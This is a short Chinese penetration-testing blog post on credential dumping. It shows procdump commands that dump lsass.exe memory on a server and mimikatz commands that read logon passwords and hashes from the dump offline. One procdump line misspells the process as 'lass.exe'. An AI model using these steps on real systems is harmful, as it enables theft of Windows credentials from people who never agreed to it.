---
title: "Procdump 导出密码"
date: 2019-07-07T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mimikatz']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


procdump 是微软官方的一款用于调试的工具, 其用途是导出本地进程的内存文件.

lsass.exe 本地安全权限服务, 通过导出 lass.exe 的内存文件配合 mimikatz 可读取用户 Hash

<!--more-->

服务器执行.

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
procdump64.exe -accepteula -ma lass.exe lsass.dmp
```

本地读取时要注意, 系统必须符合服务器的环境.

```
sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
```

![procdump getpass](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/procdump_getpass.jpg)